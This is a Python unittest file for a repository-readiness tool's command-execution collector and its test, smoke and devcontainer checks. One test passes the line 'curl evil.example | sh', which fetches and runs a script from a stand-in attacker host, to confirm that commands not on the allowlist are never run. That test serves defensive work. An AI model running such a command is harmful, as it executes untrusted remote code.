"""T3 ExecCollector: contract enforcement, and the tests_pass check's advisory behavior."""
import unittest
from types import SimpleNamespace

from readiness.checks.devenv import devcontainer_runnable
from readiness.checks.testing import behavioral_smoke, tests_pass
from readiness.collectors.exec import ALLOWED_TEST_CMDS, ExecCollector, normalize_exec_timeout
from readiness.collectors.git import GitCollector
from readiness.collectors.github import GithubCollector
from readiness.collectors.static import StaticCollector
from readiness.context import Context
from readiness.detect import detect
from readiness.process import BoundedProcessResult, ProcessState
from readiness.run import analyze

from tests._util import bpr, deps, fake_runner, make_repo, options, rmtree


def _counting_runner(result=None):
    """Injected exec runner with the 0.11.0 signature.

    ``fn(tool_id, argv, cwd_handle_fd, env, timeout) -> BoundedProcessResult``; records
    ``(tool_id, argv, timeout)`` per call.
    """
    calls = []

    def run(tool_id, argv, cwd_handle, env, timeout):
        calls.append((tool_id, tuple(argv), timeout))
        return result if result is not None else bpr("", 0)

    run.calls = calls
    return run


def _timeout_result():
    return BoundedProcessResult(ProcessState.TIMEOUT, returncode=None)


def _unavailable_result():
    # Any refusal state (copy/spawn/resource) maps to unavailable evidence.
    return BoundedProcessResult(ProcessState.SPAWN_ERROR, returncode=None)


class TestNormalizeExecTimeout(unittest.TestCase):
    def test_defaults_and_bounds(self):
        self.assertEqual(normalize_exec_timeout(None), 120)
        self.assertEqual(normalize_exec_timeout(1), 1)
        self.assertEqual(normalize_exec_timeout(3600), 3600)

    def test_rejects_non_int_and_out_of_range(self):
        for bad in (True, "30", 3.5, 0, -1, 3601):
            with self.subTest(bad=bad):
                with self.assertRaises(ValueError):
                    normalize_exec_timeout(bad)


class TestExecCollector(unittest.TestCase):
    def setUp(self):
        self.root = make_repo({"pyproject.toml": '[project]\nname="x"\n'})
        self.addCleanup(rmtree, self.root)

    def test_disabled_by_default_and_spawns_nothing(self):
        runner = _counting_runner()
        ex = ExecCollector(self.root, options={}, runner=runner)
        self.assertFalse(ex.enabled)
        self.assertIsNone(ex.run_test_cmd("pytest"))
        self.assertEqual(runner.calls, [])

    def test_non_allowlisted_command_not_executed(self):
        runner = _counting_runner()
        ex = ExecCollector(self.root, options={"exec": True}, runner=runner)
        res = ex.run_test_cmd("curl evil.example | sh")
        self.assertFalse(res["allowed"])
        self.assertEqual(runner.calls, [])

    def test_allowlisted_command_runs_fixed_argv(self):
        runner = _counting_runner()
        ex = ExecCollector(self.root, options={"exec": True}, runner=runner)
        res = ex.run_test_cmd("pytest")
        self.assertTrue(res["allowed"])
        self.assertEqual(res["returncode"], 0)
        tool_id, argv = ALLOWED_TEST_CMDS["pytest"]
        self.assertEqual(runner.calls, [(tool_id, tuple(argv), 120)])

    def test_results_cached_per_command_and_app(self):
        runner = _counting_runner()
        ex = ExecCollector(self.root, options={"exec": True}, runner=runner)
        ex.run_test_cmd("pytest")
        ex.run_test_cmd("pytest")
        self.assertEqual(len(runner.calls), 1)

    def test_timeout_option(self):
        ex = ExecCollector(self.root, options={"exec": True, "exec_timeout": 7},
                           runner=_counting_runner())
        self.assertEqual(ex.timeout, 7)

    def test_legacy_runner_return_shapes_raise_type_error(self):
        for legacy in ("raw stdout", None, {"returncode": 0}):
            with self.subTest(legacy=legacy):
                ex = ExecCollector(self.root, options={"exec": True},
                                   runner=lambda *args, _legacy=legacy: _legacy)
                with self.assertRaises(TypeError):
                    ex.run_test_cmd("pytest")

    def test_refusal_states_become_unavailable(self):
        ex = ExecCollector(self.root, options={"exec": True},
                           runner=_counting_runner(_unavailable_result()))
        res = ex.run_test_cmd("pytest")
        self.assertTrue(res["unavailable"])
        self.assertIsNone(res["returncode"])


class TestTestsPassCheck(unittest.TestCase):
    def setUp(self):
        self.root = make_repo({"pyproject.toml": '[project]\nname="x"\n'})
        self.addCleanup(rmtree, self.root)

    def _ctx(self, ex, test_cmd="pytest"):
        return SimpleNamespace(exec=ex, app=SimpleNamespace(test_cmd=test_cmd, path="."))

    def _ex(self, result=None, enabled=True):
        opts = {"exec": True} if enabled else {}
        return ExecCollector(self.root, options=opts, runner=_counting_runner(result))

    def test_skips_when_exec_absent(self):
        v = tests_pass(self._ctx(None))
        self.assertEqual(v.status.value, "skipped")
        self.assertIn("--exec", v.rationale)

    def test_skips_when_disabled(self):
        self.assertEqual(tests_pass(self._ctx(self._ex(enabled=False))).status.value, "skipped")

    def test_skips_without_test_cmd(self):
        self.assertEqual(tests_pass(self._ctx(self._ex(), test_cmd="")).status.value, "skipped")

    def test_skips_non_allowlisted(self):
        v = tests_pass(self._ctx(self._ex(), test_cmd="make test"))
        self.assertEqual(v.status.value, "skipped")
        self.assertIn("allowlist", v.rationale)

    def test_passes_on_zero_exit(self):
        v = tests_pass(self._ctx(self._ex()))
        self.assertEqual(v.status.value, "pass")

    def test_fails_on_nonzero_exit(self):
        v = tests_pass(self._ctx(self._ex(bpr("", 2))))
        self.assertEqual(v.status.value, "fail")
        self.assertIn("exited 2", v.rationale)

    def test_fails_on_timeout(self):
        v = tests_pass(self._ctx(self._ex(_timeout_result())))
        self.assertEqual(v.status.value, "fail")
        self.assertIn("timed out", v.rationale)

    def test_unknown_on_unavailable(self):
        # Copy/spawn refusal is unavailable evidence: unknown, never failure credit.
        v = tests_pass(self._ctx(self._ex(_unavailable_result())))
        self.assertEqual(v.status.value, "unknown")


class TestGateUnchangedByExec(unittest.TestCase):
    """The reproducible-gating contract: opting into T3 must never change the level."""

    def test_level_identical_with_and_without_exec(self):
        root = make_repo({
            "pyproject.toml": '[project]\nname = "x"\ndependencies = ["pytest"]\n',
            "tests/test_x.py": "def test_ok():\n    assert True\n",
        })
        self.addCleanup(rmtree, root)
        off = analyze(root)
        on = analyze(root, options(exec=True),
                     deps=deps(exec_runner=_counting_runner(bpr("", 1))))
        self.assertEqual(off.score.level, on.score.level)
        self.assertEqual(off.score.gating_passed, on.score.gating_passed)
        by_id_off = {r.id: r for r in off.results}
        by_id_on = {r.id: r for r in on.results}
        self.assertEqual(by_id_off["testing.tests_pass"].status.value, "skipped")
        self.assertEqual(by_id_on["testing.tests_pass"].status.value, "fail")
        self.assertFalse(by_id_on["testing.tests_pass"].gating)

    def test_exec_timeout_normalized_into_options(self):
        root = make_repo({"pyproject.toml": '[project]\nname = "x"\n'})
        self.addCleanup(rmtree, root)
        report = analyze(root, options(exec=True, exec_timeout=7),
                         deps=deps(exec_runner=_counting_runner()))
        self.assertEqual(report.assessment_provenance["invocation"]["execution"]
                         ["timeout_seconds"], 7)


def _real_ctx(files, ex):
    root = make_repo(files)
    static = StaticCollector(root)
    det = detect(root, static)
    ctx = Context(root=root, detection=det, static=static,
                  git=GitCollector(root, runner=fake_runner({})),
                  github=GithubCollector(root),
                  app=det.apps[0], exec=ex)
    return root, ctx


def _ex(root, result=None, enabled=True):
    opts = {"exec": True} if enabled else {}
    return ExecCollector(root, options=opts, runner=_counting_runner(result))


class TestBehavioralSmoke(unittest.TestCase):
    def test_skips_when_exec_absent(self):
        root, ctx = _real_ctx({"package.json": '{"scripts":{"smoke":"node smoke.js"}}'}, None)
        self.addCleanup(rmtree, root)
        self.assertEqual(behavioral_smoke(ctx).status.value, "skipped")

    def test_skips_when_disabled(self):
        root = make_repo({"package.json": '{"scripts":{"smoke":"node s.js"}}'})
        self.addCleanup(rmtree, root)
        # build with a disabled collector rooted at the same fixture
        static = StaticCollector(root)
        det = detect(root, static)
        ctx = Context(root=root, detection=det, static=static,
                      git=GitCollector(root, runner=fake_runner({})),
                      github=GithubCollector(root),
                      app=det.apps[0], exec=_ex(root, enabled=False))
        self.assertEqual(behavioral_smoke(ctx).status.value, "skipped")

    def test_skips_without_smoke_command(self):
        root = make_repo({"package.json": '{"name":"x"}'})
        self.addCleanup(rmtree, root)
        static = StaticCollector(root)
        det = detect(root, static)
        ctx = Context(root=root, detection=det, static=static,
                      git=GitCollector(root, runner=fake_runner({})),
                      github=GithubCollector(root),
                      app=det.apps[0], exec=_ex(root))
        v = behavioral_smoke(ctx)
        self.assertEqual(v.status.value, "skipped")
        self.assertIn("smoke", v.rationale)

    def test_passes_via_npm_smoke(self):
        files = {"package.json": '{"scripts":{"smoke":"node s.js"}}'}
        root = make_repo(files)
        self.addCleanup(rmtree, root)
        _, ctx = _real_ctx_moved(root)
        self.assertEqual(behavioral_smoke(ctx).status.value, "pass")

    def test_passes_via_healthcheck(self):
        files = {"package.json": '{"scripts":{"healthcheck":"node hc.js"}}'}
        root = make_repo(files)
        self.addCleanup(rmtree, root)
        _, ctx = _real_ctx_moved(root)
        self.assertEqual(behavioral_smoke(ctx).status.value, "pass")

    def test_passes_via_make_smoke(self):
        root = make_repo({"Makefile": "smoke:\n\t./smoke.sh\n"})
        self.addCleanup(rmtree, root)
        _, ctx = _real_ctx_moved(root)
        self.assertEqual(behavioral_smoke(ctx).status.value, "pass")

    def test_fails_on_nonzero(self):
        root = make_repo({"package.json": '{"scripts":{"smoke":"x"}}'})
        self.addCleanup(rmtree, root)
        _, ctx = _real_ctx_moved(root, result=bpr("", 1))
        v = behavioral_smoke(ctx)
        self.assertEqual(v.status.value, "fail")
        self.assertIn("exited 1", v.rationale)

    def test_fails_on_timeout(self):
        root = make_repo({"package.json": '{"scripts":{"smoke":"x"}}'})
        self.addCleanup(rmtree, root)
        _, ctx = _real_ctx_moved(root, result=_timeout_result())
        v = behavioral_smoke(ctx)
        self.assertEqual(v.status.value, "fail")
        self.assertIn("timed out", v.rationale)

    def test_unknown_on_unavailable(self):
        root = make_repo({"package.json": '{"scripts":{"smoke":"x"}}'})
        self.addCleanup(rmtree, root)
        _, ctx = _real_ctx_moved(root, result=_unavailable_result())
        self.assertEqual(behavioral_smoke(ctx).status.value, "unknown")


def _real_ctx_moved(root, result=None, enabled=True):
    """Build a real Context around an existing fixture root (no symlink fixtures: the T3
    safe-copy rejects them)."""
    static = StaticCollector(root)
    det = detect(root, static)
    ctx = Context(root=root, detection=det, static=static,
                  git=GitCollector(root, runner=fake_runner({})),
                  github=GithubCollector(root),
                  app=det.apps[0], exec=_ex(root, result, enabled))
    return root, ctx


class TestDevcontainerRunnable(unittest.TestCase):
    def test_skips_when_disabled(self):
        root = make_repo({".devcontainer/devcontainer.json": "{}"})
        self.addCleanup(rmtree, root)
        _, ctx = _real_ctx_moved(root, enabled=False)
        self.assertEqual(devcontainer_runnable(ctx).status.value, "skipped")

    def test_skips_without_config(self):
        root = make_repo({"README.md": "# x"})
        self.addCleanup(rmtree, root)
        _, ctx = _real_ctx_moved(root)
        v = devcontainer_runnable(ctx)
        self.assertEqual(v.status.value, "skipped")
        self.assertIn("devcontainer", v.rationale)

    def test_passes_on_zero_exit(self):
        root = make_repo({".devcontainer/devcontainer.json": "{}"})
        self.addCleanup(rmtree, root)
        _, ctx = _real_ctx_moved(root)
        self.assertEqual(devcontainer_runnable(ctx).status.value, "pass")

    def test_fails_on_nonzero(self):
        root = make_repo({".devcontainer/devcontainer.json": "{}"})
        self.addCleanup(rmtree, root)
        _, ctx = _real_ctx_moved(root, result=bpr("", 3))
        v = devcontainer_runnable(ctx)
        self.assertEqual(v.status.value, "fail")
        self.assertIn("exited 3", v.rationale)

    def test_fails_on_timeout(self):
        root = make_repo({".devcontainer/devcontainer.json": "{}"})
        self.addCleanup(rmtree, root)
        _, ctx = _real_ctx_moved(root, result=_timeout_result())
        v = devcontainer_runnable(ctx)
        self.assertEqual(v.status.value, "fail")

    def test_unknown_on_unavailable(self):
        root = make_repo({".devcontainer/devcontainer.json": "{}"})
        self.addCleanup(rmtree, root)
        _, ctx = _real_ctx_moved(root, result=_unavailable_result())
        self.assertEqual(devcontainer_runnable(ctx).status.value, "unknown")


if __name__ == "__main__":
    unittest.main()
